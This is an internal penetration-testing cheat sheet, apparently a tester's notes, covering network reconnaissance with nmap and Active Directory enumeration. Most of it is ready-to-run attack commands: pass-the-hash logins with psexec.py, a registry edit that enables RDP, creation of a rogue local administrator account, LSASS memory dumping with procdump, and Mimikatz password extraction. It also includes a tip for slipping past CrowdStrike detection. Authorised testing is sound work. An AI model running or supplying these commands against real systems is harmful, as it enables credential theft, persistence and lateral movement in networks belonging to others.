# Internal Pentest Cheetsheet

## Recon
1) Use wireshark to listen for 30mins, once completed sift through it and try to identify hosts/interesting things.
2) Get/determine subnets in scope and add them to a file called ips.txt.
3) Run nmap ping scans to determine which hosts are up in the subnet, then full TCP/UDP scan. The below command does it all and saves at every step.
```
nmap --max-rtt-timeout 100ms --initial-rtt-timeout 100ms --max-retries 0 -sn \
-iL ./ips.txt > results_all.txt && cat results_all.txt | grep up -B1 | cut -d " " -f5 | \
grep 10 >> cleaned_ips.txt && nmap --max-rtt-timeout 100ms --initial-rtt-timeout 100ms \ 
--max-retries 0 -sS -sU -sC -sV -O -T4 -p- -v -n -Pn -PS -A --open -iL ./cleaned_ips.txt -oA *CLIENT NAME*
```
4) Now you have all the up hosts, their ports etc, feed the XML into pentest-machine, it'll speed up the enumeration of large subnets.
5) Eliminate low hanging fruit
6) If user account is provided, use bloodhound or AD-Recon.ps1 to enumerate all of AD.
  Feed AD-Recon's Computers.csv into fruity-ad.py - it'll show you what you can pwn easily.
7) Profit

## Exploitation
1) Stop, think, am I going to break shit?
2) RECORD EVERY STEP
3) Verify your exploit will work
4) Clean up after yourself

## Post-Exploitation


## Useful shit

#### Use eternalblue_psexec - the others hardly work

### Dont always have to crack the hash, maybe pass it??
```
psexec.py -hashes LM:NTLM DOMAIN/User@IP
smbclient.py -hashes LM:NTLM DOMAIN/User@IP
```
MSF Allows you to use the NTLM hash in the password field in exploit/windows/smb_psexec
Don't forget that native upload (Target 3) works if powershell is disabled on the box

### Enable RDP from CMD
```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

### Create localadmin
```
net user *username* *password* /add
net localgroup administrators *username* /add
net localgroup "Remote Desktop Users" *username* /add
```

### Procdump LSASS for creds
This creates a memory dump using the procdump sysinternals tool.
(Crowdstrike doesnt block procdump.exe but blocks procdump64.exe no idea why)
#### 32bit
`C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp`
#### 64bit
`C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp`
#### Mimikatz Extaction
```
sekurlsa::minidump lsass.dmp
sekurlsa::passwords full
```
